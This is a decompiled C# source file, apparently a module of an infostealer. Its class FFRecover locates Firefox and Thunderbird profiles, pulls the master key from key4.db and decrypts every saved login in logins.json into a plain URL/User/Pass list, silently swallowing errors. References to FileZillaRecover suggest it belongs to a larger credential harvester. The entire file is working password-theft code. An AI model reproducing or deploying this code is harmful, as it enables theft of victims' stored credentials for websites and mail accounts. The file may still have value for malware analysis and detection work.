using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000014 RID: 20
[StandardModule]
internal sealed class FFRecover
{
	// Token: 0x060000B6 RID: 182 RVA: 0x0000D1F8 File Offset: 0x0000B3F8
	public static object GetFFTBPass()
	{
		string left = string.Empty;
		left = Conversions.ToString(Operators.ConcatenateObject(left, FFRecover.FFTB("Thunderbird")));
		return Conversions.ToString(Operators.ConcatenateObject(left, FFRecover.FFTB("Firefox")));
	}

	// Token: 0x060000B7 RID: 183 RVA: 0x0000D238 File Offset: 0x0000B438
	public static object FFTB(string type)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		try
		{
			if (Operators.CompareString(type, "Thunderbird", false) == 0)
			{
				text = Interaction.Environ("appdata") + "\\Thunderbird";
			}
			else if (Operators.CompareString(type, "Firefox", false) == 0)
			{
				text = Interaction.Environ("appdata") + "\\Mozilla\\Firefox";
			}
			if (Directory.Exists(text))
			{
				foreach (string str in Directory.GetDirectories(text + "\\Profiles"))
				{
					string text3 = str + "\\key4.db";
					if (File.Exists(text3))
					{
						FFRecover.DBHelper dbhelper = new FFRecover.DBHelper();
						byte[] key = new byte[24];
						key = dbhelper.CheckKey4DB(text3);
						string text4 = File.ReadAllText(str + "\\logins.json");
						string[] array = text4.Split(new string[]
						{
							"\"hostname\":\""
						}, StringSplitOptions.None);
						int num = 1;
						int num2 = array.Length - 1;
						for (int j = num; j <= num2; j++)
						{
							if (Operators.CompareString(text2, string.Empty, false) == 0)
							{
								text2 = text2 + type + ": \r\n";
							}
							text2 = text2 + "URL: " + FileZillaRecover.MidStr(array[j], "", "\",\"") + "\r\n";
							string s = FileZillaRecover.MidStr(array[j], "encryptedUsername\":\"", "\",\"encryptedPassword");
							string s2 = FileZillaRecover.MidStr(array[j], "encryptedPassword\":\"", "\",\"guid");
							FFRecover.Asn1Der asn1Der = new FFRecover.Asn1Der();
							FFRecover.Asn1DerObject asn1DerObject = asn1Der.Parse(Convert.FromBase64String(s));
							FFRecover.Asn1DerObject asn1DerObject2 = asn1Der.Parse(Convert.FromBase64String(s2));
							string input = Conversions.ToString(FFRecover.TripleDESHelper.DESCBCDecryptor(key, asn1DerObject.ObjLists[0].ObjLists[1].ObjLists[1].Data, asn1DerObject.ObjLists[0].ObjLists[2].Data, true));
							string input2 = Conversions.ToString(FFRecover.TripleDESHelper.DESCBCDecryptor(key, asn1DerObject2.ObjLists[0].ObjLists[1].ObjLists[1].Data, asn1DerObject2.ObjLists[0].ObjLists[2].Data, true));
							text2 = text2 + "User: " + Regex.Replace(input, "[^\\u0020-\\u007F]", "") + "\r\n";
							text2 = text2 + "Pass: " + Regex.Replace(input2, "[^\\u0020-\\u007F]", "") + "\r\n\r\n";
						}
					}
				}
			}
			if (Operators.CompareString(text2, string.Empty, false) != 0)
			{
				text2 += "\r\n";
			}
		}
		catch (Exception ex)
		{
		}
		return text2;
	}

	// Token: 0x02000022 RID: 34
	public class Asn1Der
	{
		// Token: 0x060000EC RID: 236 RVA: 0x0000D52C File Offset: 0x0000B72C
		public FFRecover.Asn1DerObject Parse(byte[] dataToParse)
		{
			FFRecover.Asn1DerObject asn1DerObject = new FFRecover.Asn1DerObject();
			int num = 0;
			int num2 = dataToParse.Length - 1;
			for (int i = num; i <= num2; i++)
			{
				FFRecover.Asn1Der.Type type = (FFRecover.Asn1Der.Type)dataToParse[i];
				if (type == FFRecover.Asn1Der.Type.Sequence)
				{
					byte[] array;
					if (asn1DerObject.Lenght == 0)
					{
						asn1DerObject.Type = FFRecover.Asn1Der.Type.Sequence;
						asn1DerObject.Lenght = dataToParse.Length - (i + 2);
						array = new byte[asn1DerObject.Lenght - 1 + 1];
					}
					else
					{
						FFRecover.Asn1DerObject asn1DerObject2 = new FFRecover.Asn1DerObject();
						asn1DerObject2.Type = FFRecover.Asn1Der.Type.Sequence;
						asn1DerObject2.Lenght = (int)dataToParse[i + 1];
						asn1DerObject.ObjLists.Add(asn1DerObject2);
						array = new byte[(int)(dataToParse[i + 1] - 1 + 1)];
					}
					if (array.Length > dataToParse.Length - (i + 2))
					{
						int length = dataToParse.Length - (i + 2);
					}
					else
					{
						int length = array.Length;
					}
					Array.Copy(dataToParse, i + 2, array, 0, array.Length);
					asn1DerObject.ObjLists.Add(this.Parse(array));
					i = i + 1 + (int)dataToParse[i + 1];
				}
				else if (type == FFRecover.Asn1Der.Type.Integerr)
				{
					FFRecover.Asn1DerObject asn1DerObject3 = new FFRecover.Asn1DerObject();
					asn1DerObject3.Type = FFRecover.Asn1Der.Type.Integerr;
					asn1DerObject3.Lenght = (int)dataToParse[i + 1];
					asn1DerObject.ObjLists.Add(asn1DerObject3);
					byte[] array = new byte[(int)(dataToParse[i + 1] - 1 + 1)];
					int length;
					if (array.Length > dataToParse.Length - (i + 2))
					{
						length = dataToParse.Length - (i + 2);
					}
					else
					{
						length = array.Length;
					}
					Array.Copy(dataToParse, i + 2, array, 0, length);
					asn1DerObject.ObjLists[asn1DerObject.ObjLists.Count - 1].Data = array;
					i = i + 1 + asn1DerObject.ObjLists[asn1DerObject.ObjLists.Count - 1].Lenght;
				}
				else if (type == FFRecover.Asn1Der.Type.OctetString)
				{
					FFRecover.Asn1DerObject asn1DerObject4 = new FFRecover.Asn1DerObject();
					asn1DerObject4.Type = FFRecover.Asn1Der.Type.OctetString;
					asn1DerObject4.Lenght = (int)dataToParse[i + 1];
					asn1DerObject.ObjLists.Add(asn1DerObject4);
					byte[] array = new byte[(int)(dataToParse[i + 1] - 1 + 1)];
					int length;
					if (array.Length > dataToParse.Length - (i + 2))
					{
						length = dataToParse.Length - (i + 2);
					}
					else
					{
						length = array.Length;
					}
					Array.Copy(dataToParse, i + 2, array, 0, length);
					asn1DerObject.ObjLists[asn1DerObject.ObjLists.Count - 1].Data = array;
					i = i + 1 + asn1DerObject.ObjLists[asn1DerObject.ObjLists.Count - 1].Lenght;
				}
				else if (type == FFRecover.Asn1Der.Type.ObjectIdentifier)
				{
					FFRecover.Asn1DerObject asn1DerObject5 = new FFRecover.Asn1DerObject();
					asn1DerObject5.Type = FFRecover.Asn1Der.Type.ObjectIdentifier;
					asn1DerObject5.Lenght = (int)dataToParse[i + 1];
					asn1DerObject.ObjLists.Add(asn1DerObject5);
					byte[] array = new byte[(int)(dataToParse[i + 1] - 1 + 1)];
					int length;
					if (array.Length > dataToParse.Length - (i + 2))
					{
						length = dataToParse.Length - (i + 2);
					}
					else
					{
						length = array.Length;
					}
					Array.Copy(dataToParse, i + 2, array, 0, length);
					asn1DerObject.ObjLists[asn1DerObject.ObjLists.Count - 1].Data = array;
					i = i + 1 + asn1DerObject.ObjLists[asn1DerObject.ObjLists.Count - 1].Lenght;
				}
			}
			return asn1DerObject;
		}

		// Token: 0x0200002E RID: 46
		public enum Type
		{
			// Token: 0x040000B5 RID: 181
			Sequence = 48,
			// Token: 0x040000B6 RID: 182
			Integerr = 2,
			// Token: 0x040000B7 RID: 183
			BitString,
			// Token: 0x040000B8 RID: 184
			OctetString,
			// Token: 0x040000B9 RID: 185
			Null,
			// Token: 0x040000BA RID: 186
			ObjectIdentifier
		}
	}

	// Token: 0x02000023 RID: 35
	public class Asn1DerObject
	{
		// Token: 0x060000ED RID: 237 RVA: 0x0000D820 File Offset: 0x0000BA20
		public Asn1DerObject()
		{
			this.ObjLists = new List<FFRecover.Asn1DerObject>();
		}

		// Token: 0x0400008E RID: 142
		public FFRecover.Asn1Der.Type Type;

		// Token: 0x0400008F RID: 143
		public int Lenght;

		// Token: 0x04000090 RID: 144
		public List<FFRecover.Asn1DerObject> ObjLists;

		// Token: 0x04000091 RID: 145
		public byte[] Data;
	}

	// Token: 0x02000024 RID: 36
	public class DBHelper
	{
		// Token: 0x060000EF RID: 239 RVA: 0x0000D83C File Offset: 0x0000BA3C
		public byte[] CheckKey4DB(string directory)
		{
			byte[] result;
			try
			{
				FFRecover.Asn1Der asn1Der = new FFRecover.Asn1Der();
				byte[] dataToParse = new byte[0];
				byte[] globalSalt = new byte[0];
				byte[] dataToParse2 = new byte[0];
				byte[] array = new byte[0];
				this.GetItemsFromQuery(directory, ref globalSalt, ref dataToParse, "metaData");
				FFRecover.Asn1DerObject asn1DerObject = asn1Der.Parse(dataToParse);
				this.GetItemsFromQuery(directory, ref dataToParse2, ref array, "nssPrivate");
				object instance = asn1Der.Parse(dataToParse2);
				object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "ObjLists", new object[]
				{
					0
				}, null, null, null), null, "ObjLists", new object[]
				{
					0
				}, null, null, null), null, "ObjLists", new object[]
				{
					1
				}, null, null, null), null, "ObjLists", new object[]
				{
					0
				}, null, null, null), null, "Data", new object[0], null, null, null));
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "ObjLists", new object[]
				{
					0
				}, null, null, null), null, "ObjLists", new object[]
				{
					1
				}, null, null, null), null, "Data", new object[0], null, null, null));
				result = this.decrypt3DES(globalSalt, (byte[])objectValue, (byte[])objectValue2);
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x0000D9F0 File Offset: 0x0000BBF0
		private byte[] decrypt3DES(byte[] globalSalt, byte[] entrySalt, byte[] cipherT)
		{
			byte[] result;
			try
			{
				object obj = SHA1.Create("sha1");
				object instance = obj;
				System.Type type = null;
				string memberName = "ComputeHash";
				object[] array = new object[]
				{
					globalSalt
				};
				object[] arguments = array;
				string[] argumentNames = null;
				System.Type[] typeArguments = null;
				bool[] array2 = new bool[]
				{
					true
				};
				object obj2 = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array2);
				if (array2[0])
				{
					globalSalt = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				byte[] array3 = (byte[])obj2;
				Array.Resize<byte>(ref array3, 40);
				Array.Copy(entrySalt, 0, array3, 20, 20);
				byte[] array4 = entrySalt;
				Array.Resize<byte>(ref array4, 40);
				Array.Copy(entrySalt, 0, array4, 20, 20);
				object instance2 = obj;
				System.Type type2 = null;
				string memberName2 = "ComputeHash";
				object[] array5 = new object[]
				{
					array3
				};
				object[] arguments2 = array5;
				string[] argumentNames2 = null;
				System.Type[] typeArguments2 = null;
				array2 = new bool[]
				{
					true
				};
				object obj3 = NewLateBinding.LateGet(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array2);
				if (array2[0])
				{
					array3 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
				}
				object objectValue = RuntimeHelpers.GetObjectValue(obj3);
				object obj4 = HMAC.Create();
				NewLateBinding.LateSet(obj4, null, "Key", new object[]
				{
					RuntimeHelpers.GetObjectValue(objectValue)
				}, null, null);
				object instance3 = obj4;
				System.Type type3 = null;
				string memberName3 = "ComputeHash";
				array5 = new object[]
				{
					array4
				};
				object[] arguments3 = array5;
				string[] argumentNames3 = null;
				System.Type[] typeArguments3 = null;
				array2 = new bool[]
				{
					true
				};
				object obj5 = NewLateBinding.LateGet(instance3, type3, memberName3, arguments3, argumentNames3, typeArguments3, array2);
				if (array2[0])
				{
					array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(obj5);
				Array.Resize<byte>(ref array4, 20);
				object instance4 = obj4;
				System.Type type4 = null;
				string memberName4 = "ComputeHash";
				array5 = new object[]
				{
					array4
				};
				object[] arguments4 = array5;
				string[] argumentNames4 = null;
				System.Type[] typeArguments4 = null;
				array2 = new bool[]
				{
					true
				};
				object obj6 = NewLateBinding.LateGet(instance4, type4, memberName4, arguments4, argumentNames4, typeArguments4, array2);
				if (array2[0])
				{
					array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
				}
				object objectValue3 = RuntimeHelpers.GetObjectValue(obj6);
				object instance5 = null;
				System.Type typeFromHandle = typeof(Array);
				string memberName5 = "Resize";
				array5 = new object[]
				{
					RuntimeHelpers.GetObjectValue(objectValue3),
					40
				};
				object[] arguments5 = array5;
				string[] argumentNames5 = null;
				System.Type[] typeArguments5 = null;
				array2 = new bool[]
				{
					true,
					false
				};
				NewLateBinding.LateCall(instance5, typeFromHandle, memberName5, arguments5, argumentNames5, typeArguments5, array2, true);
				if (array2[0])
				{
					objectValue3 = RuntimeHelpers.GetObjectValue(array5[0]);
				}
				object instance6 = null;
				System.Type typeFromHandle2 = typeof(Array);
				string memberName6 = "Copy";
				array5 = new object[]
				{
					entrySalt,
					0,
					RuntimeHelpers.GetObjectValue(objectValue3),
					20,
					20
				};
				object[] arguments6 = array5;
				string[] argumentNames6 = null;
				System.Type[] typeArguments6 = null;
				array2 = new bool[]
				{
					true,
					false,
					true,
					false,
					false
				};
				NewLateBinding.LateCall(instance6, typeFromHandle2, memberName6, arguments6, argumentNames6, typeArguments6, array2, true);
				if (array2[0])
				{
					entrySalt = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
				}
				if (array2[2])
				{
					objectValue3 = RuntimeHelpers.GetObjectValue(array5[2]);
				}
				object instance7 = obj4;
				System.Type type5 = null;
				string memberName7 = "ComputeHash";
				array5 = new object[]
				{
					RuntimeHelpers.GetObjectValue(objectValue3)
				};
				object[] arguments7 = array5;
				string[] argumentNames7 = null;
				System.Type[] typeArguments7 = null;
				array2 = new bool[]
				{
					true
				};
				object obj7 = NewLateBinding.LateGet(instance7, type5, memberName7, arguments7, argumentNames7, typeArguments7, array2);
				if (array2[0])
				{
					objectValue3 = RuntimeHelpers.GetObjectValue(array5[0]);
				}
				object objectValue4 = RuntimeHelpers.GetObjectValue(obj7);
				object instance8 = null;
				System.Type typeFromHandle3 = typeof(Array);
				string memberName8 = "Resize";
				array5 = new object[]
				{
					RuntimeHelpers.GetObjectValue(objectValue2),
					40
				};
				object[] arguments8 = array5;
				string[] argumentNames8 = null;
				System.Type[] typeArguments8 = null;
				array2 = new bool[]
				{
					true,
					false
				};
				NewLateBinding.LateCall(instance8, typeFromHandle3, memberName8, arguments8, argumentNames8, typeArguments8, array2, true);
				if (array2[0])
				{
					objectValue2 = RuntimeHelpers.GetObjectValue(array5[0]);
				}
				object instance9 = null;
				System.Type typeFromHandle4 = typeof(Array);
				string memberName9 = "Copy";
				array5 = new object[]
				{
					RuntimeHelpers.GetObjectValue(objectValue4),
					0,
					RuntimeHelpers.GetObjectValue(objectValue2),
					20,
					20
				};
				object[] arguments9 = array5;
				string[] argumentNames9 = null;
				System.Type[] typeArguments9 = null;
				array2 = new bool[]
				{
					true,
					false,
					true,
					false,
					false
				};
				NewLateBinding.LateCall(instance9, typeFromHandle4, memberName9, arguments9, argumentNames9, typeArguments9, array2, true);
				if (array2[0])
				{
					objectValue4 = RuntimeHelpers.GetObjectValue(array5[0]);
				}
				if (array2[2])
				{
					objectValue2 = RuntimeHelpers.GetObjectValue(array5[2]);
				}
				int num = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(objectValue2, null, "Length", new object[0], null, null, null), 8));
				int num2 = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(objectValue2, null, "Length", new object[0], null, null, null), num));
				object obj8 = new byte[num2 - 1 + 1];
				object instance10 = null;
				System.Type typeFromHandle5 = typeof(Array);
				string memberName10 = "Copy";
				array5 = new object[]
				{
					RuntimeHelpers.GetObjectValue(objectValue2),
					num,
					RuntimeHelpers.GetObjectValue(obj8),
					0,
					num2
				};
				object[] arguments10 = array5;
				string[] argumentNames10 = null;
				System.Type[] typeArguments10 = null;
				array2 = new bool[]
				{
					true,
					true,
					true,
					false,
					true
				};
				NewLateBinding.LateCall(instance10, typeFromHandle5, memberName10, arguments10, argumentNames10, typeArguments10, array2, true);
				if (array2[0])
				{
					objectValue2 = RuntimeHelpers.GetObjectValue(array5[0]);
				}
				if (array2[1])
				{
					num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[1]), typeof(int));
				}
				if (array2[2])
				{
					obj8 = RuntimeHelpers.GetObjectValue(array5[2]);
				}
				if (array2[4])
				{
					num2 = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[4]), typeof(int));
				}
				int num3 = 24;
				object obj9 = new byte[num3 - 1 + 1];
				object instance11 = null;
				System.Type typeFromHandle6 = typeof(Array);
				string memberName11 = "Copy";
				array5 = new object[]
				{
					RuntimeHelpers.GetObjectValue(objectValue2),
					0,
					RuntimeHelpers.GetObjectValue(obj9),
					0,
					num3
				};
				object[] arguments11 = array5;
				string[] argumentNames11 = null;
				System.Type[] typeArguments11 = null;
				array2 = new bool[]
				{
					true,
					false,
					true,
					false,
					true
				};
				NewLateBinding.LateCall(instance11, typeFromHandle6, memberName11, arguments11, argumentNames11, typeArguments11, array2, true);
				if (array2[0])
				{
					objectValue2 = RuntimeHelpers.GetObjectValue(array5[0]);
				}
				if (array2[2])
				{
					obj9 = RuntimeHelpers.GetObjectValue(array5[2]);
				}
				if (array2[4])
				{
					num3 = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[4]), typeof(int));
				}
				int num4 = 24;
				object obj10 = new byte[num3 - 1 + 1];
				object instance12 = null;
				System.Type typeFromHandle7 = typeof(Array);
				string memberName12 = "Copy";
				array5 = new object[]
				{
					RuntimeHelpers.GetObjectValue(FFRecover.TripleDESHelper.DESCBCDecryptor((byte[])obj9, (byte[])obj8, cipherT, false)),
					0,
					RuntimeHelpers.GetObjectValue(obj10),
					0,
					num4
				};
				object[] arguments12 = array5;
				string[] argumentNames12 = null;
				System.Type[] typeArguments12 = null;
				array2 = new bool[]
				{
					false,
					false,
					true,
					false,
					true
				};
				NewLateBinding.LateCall(instance12, typeFromHandle7, memberName12, arguments12, argumentNames12, typeArguments12, array2, true);
				if (array2[2])
				{
					obj10 = RuntimeHelpers.GetObjectValue(array5[2]);
				}
				if (array2[4])
				{
					num4 = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[4]), typeof(int));
				}
				result = (byte[])obj10;
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x0000E184 File Offset: 0x0000C384
		private void GetItemsFromQuery(string direct, ref byte[] item1, ref byte[] item2, string tablename)
		{
			SqLiteHandler sqLiteHandler = new SqLiteHandler(direct);
			sqLiteHandler.ReadTable(tablename);
			string value;
			string value2;
			if (Operators.CompareString(tablename, "metaData", false) == 0)
			{
				value = sqLiteHandler.GetValue(0, 1);
				value2 = sqLiteHandler.GetValue(0, 2);
			}
			else if (Operators.CompareString(tablename, "nssPrivate", false) == 0)
			{
				value = sqLiteHandler.GetValue(0, "a11");
				value2 = sqLiteHandler.GetValue(0, "a102");
			}
			item1 = Encoding.Default.GetBytes(value);
			item2 = Encoding.Default.GetBytes(value2);
		}
	}

	// Token: 0x02000025 RID: 37
	public class TripleDESHelper
	{
		// Token: 0x060000F3 RID: 243 RVA: 0x0000E214 File Offset: 0x0000C414
		public static object DESCBCDecryptor(byte[] key, byte[] iv, byte[] input, bool asstring)
		{
			byte[] array = new byte[512];
			object result;
			using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
			{
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.IV = iv;
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
				ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(tripleDESCryptoServiceProvider.Key, tripleDESCryptoServiceProvider.IV);
				using (MemoryStream memoryStream = new MemoryStream(input))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
					{
						if (asstring)
						{
							using (StreamReader streamReader = new StreamReader(cryptoStream))
							{
								return streamReader.ReadToEnd();
							}
						}
						cryptoStream.Read(array, 0, array.Length);
						result = array;
					}
				}
			}
			return result;
		}
	}
}
